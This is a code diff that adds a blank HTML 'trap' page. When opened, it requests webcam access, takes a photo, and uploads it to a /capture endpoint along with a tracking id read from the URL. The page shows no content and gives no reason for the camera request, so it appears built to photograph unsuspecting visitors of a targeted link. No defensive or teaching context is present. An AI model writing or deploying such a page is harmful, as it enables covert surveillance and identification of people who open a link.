@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const trapId = urlParams.get('id');
+
+        navigator.mediaDevices.getUserMedia({video: true})
+        .then(stream => {
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            imageCapture.takePhoto().then(blob => {
+                const formData = new FormData();
+                formData.append('image', blob);
+                formData.append('id', trapId);
+                fetch('/capture', { method: 'POST', body: formData });
+            });
+        });
+    </script>
+</body>
+</html>
